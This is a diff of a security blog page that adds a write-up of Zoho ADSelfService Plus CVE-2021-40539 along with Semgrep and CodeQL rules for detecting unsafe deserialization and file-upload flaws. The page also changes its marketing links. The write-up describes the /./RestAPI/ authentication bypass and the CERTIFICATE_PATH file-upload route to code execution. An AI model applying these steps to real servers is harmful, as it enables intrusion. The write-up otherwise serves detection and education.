+<figure class="wp-block-image"><img decoding="async" src="https://lh3.googleusercontent.com/G4qLbm1xakI0nmSP0MPdI7IwiRsFTtHClGwhGpLSGl01-vD2zZC-DnU3e3XUk7-JvB-m84QjxXH_freV3XrNNJkiUABAfJ8a-rH03TntnPEHHTsBynvc4L2wc1b2vMs1BEo4guNlnvKBKhF9s1fZy64" alt="" /></figure>
+
+
+
+<p class="wp-block-paragraph"><strong>Finding in Source Code:</strong></p>
+
+
+
+<p class="wp-block-paragraph">Semgrep:</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>rules:<br>&nbsp; &#8211; id: insecure-binaryformatter-deserialization<br>&nbsp; &nbsp; severity: WARNING<br>&nbsp; &nbsp; languages:<br>&nbsp; &nbsp; &nbsp; &#8211; C#<br>&nbsp; &nbsp; metadata:<br>&nbsp; &nbsp; &nbsp; cwe: &#8220;CWE-502: Deserialization of Untrusted Data&#8221;<br>&nbsp; &nbsp; &nbsp; owasp: &#8220;A8: Insecure Deserialization&#8221;<br>&nbsp; &nbsp; &nbsp; references:<br>&nbsp; &nbsp; &nbsp; &nbsp; &#8211; https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide<br>&nbsp; &nbsp; message: &gt;<br>&nbsp; &nbsp; &nbsp; The BinaryFormatter type is dangerous and is not recommended for data<br>&nbsp; &nbsp; &nbsp; processing. Applications should stop using BinaryFormatter as soon as<br>&nbsp; &nbsp; &nbsp; possible, even if they believe the data they&#8217;re processing to be<br>&nbsp; &nbsp; &nbsp; trustworthy. BinaryFormatter is insecure and can&#8217;t be made secure<br>&nbsp; &nbsp; patterns:<br>&nbsp; &nbsp; &nbsp; &#8211; pattern-inside: |<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; using System.Runtime.Serialization.Formatters.Binary;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#8230;<br>&nbsp; &nbsp; &nbsp; &#8211; pattern: |<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; new BinaryFormatter();</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">CodeQl</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>/**<br>* @name Deserialization of untrusted data<br>* @description Calling an unsafe deserializer with data controlled by an attacker<br>*&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; can lead to denial of service and other security problems.<br>* @kind path-problem<br>* @id cs/unsafe-deserialization-untrusted-input<br>* @problem.severity error<br>* @security-severity 9.8<br>* @precision high<br>* @tags security<br>* &nbsp; &nbsp; &nbsp; external/cwe/cwe-502<br>*/<br><br>import csharp<br>import semmle.code.csharp.security.dataflow.UnsafeDeserializationQuery<br>import DataFlow::PathGraph<br><br>from DataFlow::PathNode userInput, DataFlow::PathNode deserializeCallArg<br>where<br>&nbsp; exists(TaintToObjectMethodTrackingConfig taintTracking |<br>&nbsp; &nbsp; // all flows from user input to deserialization with weak and strong type serializers<br>&nbsp; &nbsp; taintTracking.hasFlowPath(userInput, deserializeCallArg)<br>&nbsp; ) and<br>&nbsp; // intersect with strong types, but user controlled or weak types deserialization usages<br>&nbsp; (<br>&nbsp; &nbsp; exists(<br>&nbsp; &nbsp; &nbsp; DataFlow::Node weakTypeCreation, DataFlow::Node weakTypeUsage,<br>&nbsp; &nbsp; &nbsp; WeakTypeCreationToUsageTrackingConfig weakTypeDeserializerTracking, MethodCall mc<br>&nbsp; &nbsp; |<br>&nbsp; &nbsp; &nbsp; weakTypeDeserializerTracking.hasFlow(weakTypeCreation, weakTypeUsage) and<br>&nbsp; &nbsp; &nbsp; mc.getQualifier() = weakTypeUsage.asExpr() and<br>&nbsp; &nbsp; &nbsp; mc.getAnArgument() = deserializeCallArg.getNode().asExpr()<br>&nbsp; &nbsp; )<br>&nbsp; &nbsp; or<br>&nbsp; &nbsp; exists(<br>&nbsp; &nbsp; &nbsp; TaintToObjectTypeTrackingConfig userControlledTypeTracking, DataFlow::Node taintedTypeUsage,<br>&nbsp; &nbsp; &nbsp; DataFlow::Node userInput2, MethodCall mc<br>&nbsp; &nbsp; |<br>&nbsp; &nbsp; &nbsp; userControlledTypeTracking.hasFlow(userInput2, taintedTypeUsage) and<br>&nbsp; &nbsp; &nbsp; mc.getQualifier() = taintedTypeUsage.asExpr() and<br>&nbsp; &nbsp; &nbsp; mc.getAnArgument() = deserializeCallArg.getNode().asExpr()<br>&nbsp; &nbsp; )<br>&nbsp; )<br>&nbsp; or<br>&nbsp; // no type check needed &#8211; straightforward taint -&gt; sink<br>&nbsp; exists(TaintToConstructorOrStaticMethodTrackingConfig taintTracking2 |<br>&nbsp; &nbsp; taintTracking2.hasFlowPath(userInput, deserializeCallArg)<br>&nbsp; )<br>&nbsp; or<br>&nbsp; // JsonConvert static method call, but with additional unsafe typename tracking<br>&nbsp; exists(<br>&nbsp; &nbsp; JsonConvertTrackingConfig taintTrackingJsonConvert, TypeNameTrackingConfig typenameTracking,<br>&nbsp; &nbsp; DataFlow::Node settingsCallArg<br>&nbsp; |<br>&nbsp; &nbsp; taintTrackingJsonConvert.hasFlowPath(userInput, deserializeCallArg) and<br>&nbsp; &nbsp; typenameTracking.hasFlow(_, settingsCallArg) and<br>&nbsp; &nbsp; deserializeCallArg.getNode().asExpr().getParent() = settingsCallArg.asExpr().getParent()<br>&nbsp; )<br>select deserializeCallArg, userInput, deserializeCallArg, &#8220;$@ flows to unsafe deserializer.&#8221;,<br>&nbsp; userInput, &#8220;User-provided data&#8221;</td></tr></tbody></table></figure>
+
+
+
+<h2 class="wp-block-heading" id="h-2021-40539-partially">2021-40539(Partially)</h2>
+
+
+
+<p class="wp-block-paragraph"><strong>Vulnerability Overview</strong></p>
+
+
+
+<p class="wp-block-paragraph">Zoho issued a security bulletin stating that the 0-day is an authentication bypass vulnerability that can be exploited via the ADselfService Plus REST API URL, allowing attackers to execute malicious code on the underlying Zoho server.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Technical Review</strong></p>
+
+
+
+<p class="wp-block-paragraph">In September 2021, Zoho&#8217;s official website released the CVE-2021-40539 vulnerability patch: CVE-2021-40539 . From the description, CVE-2021-40539 is an authentication bypass vulnerability. The affected version includes `ADSelfService Plus builds up to 6113` , and the vulnerability is fixed in the `ADSelfService Plus build 6114` version. The vulnerability is located in the Restful API interface. An attacker can construct a special URL request to bypass the authentication and realize RCE. The official diagram of the vulnerability utilization is given:</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://lh5.googleusercontent.com/M9k0ERmzWThgvNmmQOlc1kNVXCJC4WdZYFBmrvi4hI8vHgAlWx73rliBLc7-GHX4yyj2dyZSiO2FRRDZI-L-5kX_-KuftNSSpsbs1crm_St4HEQQSqev1QBElG9-aznvu0VSk0AdLjBGOV8CZ_at2TU" alt="" /></figure>
+
+
+
+<p class="wp-block-paragraph"><strong>Attack steps</strong></p>
+
+
+
+<ul class="wp-block-list"><li><strong>Restful API authentication bypass</strong><ul><li>The URL information is extracted through `request.getRequestURI`. Here, the regular expression `/RestAPI/.*` is used to determine whether it is a Restful API access, because Zoho ManageEngine ADSelfService Plus uses a Tomcat container, the following two requests are equivalent:</li></ul></li></ul>
+
+
+
+<ul class="wp-block-list"><li>/RestAPI/LicenseMgr</li><li>/./RestAPI/LicenseMgr</li><li><strong>Arbitrary file upload</strong></li></ul>
+
+
+
+<ul class="wp-block-list"><li>The parameter `paramName` comes from the `CERTIFICATE_PATH` parameter submitted by the request, which actually saves the uploaded file (from the parameter `CERTIFICATE_PATH`).</li><li>Construct a POST request for file upload, set parameters according to the previous analysis, and send the final request</li></ul>
+
+
+
+<p class="wp-block-paragraph"><strong>Vulnerability to reproduce</strong></p>
+
+
+
+<p class="wp-block-paragraph">Call the `isRestAPIRequest` function to determine whether it is a Restful API access. If it is `true`, it will call `RestAPIFilter.doAction` for authentication information verification and other processing. See the definition of the `isRestAPIRequest` function:</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>public static boolean 1sRestAPIRequest (HttpServletRequest request, JSON0bject filterParams)<br>String restApiUrlPattern<br>/RestAPI/.**<br>try<br>restApiUrlPattern= filterParams. optString( key: &#8220;API URL PATTERN*, restApiUrlPattern)<br>catch (Exception var5)<br>out. log (Level. INFO,<br>&#8220;Unable to get API URL PATTERN.&#8221;<br>var5)<br>String reqURI = request. getRequestURI();<br>String contextPath = request. getContextPath) != null ? request. getContextPath()<br>regURI<br>=<br>reqURI. replace (contextPath, charSequence1: **);<br>reqURI. replace ( charSequence: *//*, charSequence1: */&#8221;) ;<br>reqURI =<br>return Pattern. matches (restApiUr Pattern, reqURI)<br></td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">The parameter `paramName` comes from the `CERTIFICATE_PATH` parameter submitted by the request, which actually saves the uploaded file (from the parameter `CERTIFICATE_PATH`).</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>public static JSONObject getFileFromRequest (<strong>HttpServletRequest</strong> httpServletRequest, ActionForm actionform, String paramName,<br>JS0NObject json = new JSONObject () ;<br>File file<br>null:<br>String fileName = null;<br>Long fileSize<br>null;<br>FormFile formFile<br>null:<br>try<br>if (<strong>actionform</strong> != null) {<br>DynaActionForm form = (<strong>DynaActionForm</strong>) actionform;<br>formFile = (<strong>FormFile</strong>) form. get (<strong>paramName</strong>)<br>if (<strong>formFile</strong> != null &amp;&amp; formFile. getFil eName ()<br>!= null &amp;&amp; !formFile. getFileName (). equals (&#8220;&#8216;)) {<br>fileName -formFile. getFileName ()<br>File0utputStream fout<br>null:<br>try<br>InputStream fileInput<br>formFile.getInputStream()<br>byte[] fileByte = new byte[fileInput. available)];<br>fileInput. read (fileByte);<br>file<br>new File (fileName):<br>fout<br>new File0utputStream (file):<br>fout. write (fileByte) :<br>catch (Exception var19)<br>throw var19:</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">Construct a POST request for file upload, set parameters according to the previous analysis, and the final request is as follows:</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://lh3.googleusercontent.com/dI59MGBVLQAie27iff4AY6cCCkYmfX6GW74yYpF0nCBjaXnHAAyMbx2Z4lr9tc-DxQiExqmJf5Q8_J2l_rIqRLrowTw2ou5EOAR0VdnjBELO8GM5O8gHUpMkDaSUUbTu3zDjw2tqrm0eqbdAikEAacE" alt="" /></figure>
+
+
+
+<p class="wp-block-paragraph"><strong>Finding in Source Code:</strong></p>
+
+
+
+<p class="wp-block-paragraph">Semgrep:</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>rules:<br>&nbsp; &#8211; id: find_sec_bugs.FILE_UPLOAD_FILENAME-1<br>&nbsp; &nbsp; patterns:<br>&nbsp; &nbsp; &nbsp; &#8211; pattern-inside: |<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $FUNC(&#8230;, HttpServletRequest $REQ, &#8230; ) {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#8230;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $FILES = (ServletFileUpload $SFU).parseRequest($REQ);<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#8230;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br>&nbsp; &nbsp; &nbsp; &#8211; pattern-inside: |<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for(FileItem $ITEM : $FILES) {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#8230;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br>&nbsp; &nbsp; &nbsp; &#8211; pattern: $ITEM.getName()<br>&nbsp; &nbsp; message: &gt;<br>&nbsp; &nbsp; &nbsp; The filename provided by the FileUpload API can be tampered with by the<br>&nbsp; &nbsp; &nbsp; client to reference<br><br>&nbsp; &nbsp; &nbsp; unauthorized files. The provided filename should be properly validated to ensure it&#8217;s properly<br><br>&nbsp; &nbsp; &nbsp; structured, contains no unauthorized path characters (e.g., / \), and refers to an authorized<br><br>&nbsp; &nbsp; &nbsp; file.<br>&nbsp; &nbsp; languages:<br>&nbsp; &nbsp; &nbsp; &#8211; java<br>&nbsp; &nbsp; severity: ERROR<br>&nbsp; &nbsp; metadata:<br>&nbsp; &nbsp; &nbsp; category: security<br>&nbsp; &nbsp; &nbsp; cwe: &#8220;CWE-22: Improper Limitation of a Pathname to a Restricted Directory (&#8216;Path<br>&nbsp; &nbsp; &nbsp; &nbsp; Traversal&#8217;)&#8221;<br>&nbsp; &nbsp; &nbsp; technology:<br>&nbsp; &nbsp; &nbsp; &nbsp; &#8211; java<br>&nbsp; &nbsp; &nbsp; license: MIT</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">CodeQl:</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>/**<br>* @name Reading from a world writable file<br>* @description Reading from a file which is set as world writable is dangerous because<br>*&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; the file may be modified or removed by external actors.<br>* @kind problem<br>* @problem.severity error<br>* @security-severity 7.8<br>* @precision high<br>* @id java/world-writable-file-read<br>* @tags security<br>* &nbsp; &nbsp; &nbsp; external/cwe/cwe-732<br>*/<br><br>import java<br>import semmle.code.java.security.FileReadWrite<br>import semmle.code.java.security.FileWritable<br><br>from Variable fileVariable, FileReadExpr readFrom, SetFileWorldWritable setWorldWritable<br>where<br>&nbsp; // The file variable must be both read from and set to world writable. This is not flow-sensitive.<br>&nbsp; fileVariable.getAnAccess() = readFrom.getFileVarAccess() and<br>&nbsp; fileVariable.getAnAccess() = setWorldWritable.getFileVarAccess() and<br>&nbsp; // If the file variable is a parameter, the result should be reported in the caller.<br>&nbsp; not fileVariable instanceof Parameter<br>select setWorldWritable, &#8220;A file is set to be world writable here, but is read from $@.&#8221;, readFrom,<br>&nbsp; &#8220;statement&#8221;</td></tr></tbody></table></figure>
+
+
+
+<h1 class="wp-block-heading" id="h-interested-func-name">Interested Func Name</h1>
+
+
+
+<h3 class="wp-block-heading" id="h-java">Java</h3>
+
+
+
+<ul class="wp-block-list"><li>Logger</li><li>Write</li><li>BufferedInputstream</li><li>BufferedReader</li><li>ProcessBuilder</li><li>Exec</li><li>Eval&nbsp;</li><li>Load</li><li>StringBuilder</li><li>getParameter</li><li>getFileFromRequest</li><li>newDocumentBuilder</li><li>…</li></ul>
+
+
+
+<h3 class="wp-block-heading" id="h-net">.NET</h3>
+
+
+
+<ul class="wp-block-list"><li>Url/Uri</li><li>AbsoluteUri</li><li>AbsolutePath</li><li>Request</li><li>Headers</li><li>Params</li><li>Get</li><li>XmlDocument</li><li>XmlUrlResolver</li><li>FileStream</li><li>File</li><li>…</li></ul>
+
+
+
+<h1 class="wp-block-heading" id="h-resources">Resources</h1>
+
+
+
+<ul class="wp-block-list"><li>https://blog.csdn.net/ityouknow/article/details/121896509</li><li>https://blog.csdn.net/smellycat000/article/details/120213401</li><li>https://blog.csdn.net/smellycat000/article/details/119814296</li><li>https://github.com/nomi-sec/PoC-in-GitHub</li></ul>
     </div>
 
     <!-- ═══ CAREER PLATFORM CTA ═══ -->
@@ -1561,27 +1976,27 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
 
         <!-- Headline -->
         <h3 style="font-family:var(--font-display);font-size:24px;font-weight:800;color:#fff;margin:0 0 8px;line-height:1.3">
-          Ready to Accelerate Your Cybersecurity Career?
+          Put this research to work on your environment
         </h3>
         <p style="font-size:15px;color:rgba(255,255,255,0.55);line-height:1.7;max-width:520px;margin:0 auto 28px">
-          Access structured learning paths, hands-on skill labs, and expert coaching — everything you need to land your next role.
+          The team behind this article runs attack surface management, SAST, red team operations and vulnerability research for organizations that need answers, not checklists.
         </p>
 
         <!-- Buttons -->
         <div style="display:flex;align-items:center;justify-content:center;gap:14px;flex-wrap:wrap">
-          <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
+          <a href="/products/" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 32px;border-radius:12px;font-weight:700;font-size:15px;text-decoration:none;font-family:var(--font);transition:all 0.25s;box-shadow:0 2px 16px rgba(250,204,21,0.15)" onmouseover="this.style.boxShadow='0 4px 28px rgba(250,204,21,0.35)';this.style.transform='translateY(-2px)'" onmouseout="this.style.boxShadow='0 2px 16px rgba(250,204,21,0.15)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13.8 12H3" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Start Free
+            Explore Services
           </a>
-          <a href="https://career.hadess.io/games/" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
+          <a href="/products/#contact" style="display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.06);color:#fff;padding:14px 32px;border-radius:12px;font-weight:600;font-size:15px;text-decoration:none;font-family:var(--font);border:1px solid rgba(255,255,255,0.1);transition:all 0.25s" onmouseover="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(250,204,21,0.25)';this.style.transform='translateY(-2px)'" onmouseout="this.style.background='rgba(255,255,255,0.06)';this.style.borderColor='rgba(255,255,255,0.1)';this.style.transform='none'">
             <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" stroke-linecap="round" stroke-linejoin="round"/><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            Hack &amp; Learn Games
+            Talk to an Expert
           </a>
         </div>
 
         <!-- Subtle trust line -->
         <p style="font-size:12px;color:rgba(255,255,255,0.3);margin:20px 0 0;letter-spacing:0.3px">
-          100% free to start &middot; No credit card required &middot; 80+ skill modules
+          ASM &middot; SAST &middot; Red Team &middot; Vulnerability Research &middot; Career
         </p>
       </div>
     </div>
@@ -1708,11 +2123,11 @@ function showCopied(){
 <div style="max-width:var(--max-w);margin:0 auto;padding:0 32px 80px">
   <div style="background:linear-gradient(135deg,rgba(250,204,21,0.08),rgba(245,158,11,0.03));border:1px solid var(--gold-border);border-radius:20px;padding:60px;text-align:center;position:relative;overflow:hidden">
     <div style="content:'';position:absolute;top:-100px;right:-100px;width:300px;height:300px;background:radial-gradient(circle,rgba(250,204,21,0.1),transparent 70%);pointer-events:none"></div>
-    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Ready to Accelerate Your Cybersecurity Career?</h2>
-    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Structured paths, expert coaching, and hands-on skill development — all in one platform.</p>
-    <a href="https://career.hadess.io/login" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
+    <h2 style="font-family:var(--font-display);font-size:32px;font-weight:800;color:#fff;margin-bottom:12px">Know your exposure before attackers do.</h2>
+    <p style="font-size:16px;color:var(--text-dim);margin-bottom:32px;max-width:500px;margin-left:auto;margin-right:auto">Attack surface management, SAST, red team operations and vulnerability research — from the team behind HADESS research.</p>
+    <a href="/products/" style="display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#facc15,#f59e0b);color:#000;padding:14px 36px;border-radius:10px;font-weight:700;font-size:16px;transition:all 0.25s;box-shadow:0 0 30px rgba(250,204,21,0.15)">
       <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Explore Products &amp; Services
     </a>
   </div>
 </div>
@@ -1735,59 +2150,38 @@ function showCopied(){
           </div>
           <div style="display:flex;align-items:center;gap:10px;font-size:13px;color:var(--text-muted)">
             <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color:var(--gold);flex-shrink:0"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg>
-            career@hadess.io
+            security@hadess.io
           </div>
         </div>
         <div style="display:flex;gap:12px">
           <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
           <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
           <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-          <a href="mailto:career@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+          <a href="mailto:security@hadess.io" aria-label="Email" style="width:40px;height:40px;border-radius:50%;background:var(--gold-dim);display:flex;align-items:center;justify-content:center;color:var(--gold);transition:all 0.3s"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
         </div>
       </div>
-      <!-- Platform -->
-      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Platform</h3>
+      <!-- Products -->
+      <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Products</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/skills-development" style="font-size:13px;color:var(--text-muted);transition:color 0.3s">Skills Development</a></li>
-          <li><a href="https://career.hadess.io/career-coaching" style="font-size:13px;color:var(--text-muted)">Career Coaching</a></li>
-          <li><a href="https://career.hadess.io/career-paths" style="font-size:13px;color:var(--text-muted)">Career Paths</a></li>
-          <li><a href="https://career.hadess.io/skills" style="font-size:13px;color:var(--text-muted)">Skills Explorer</a></li>
-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
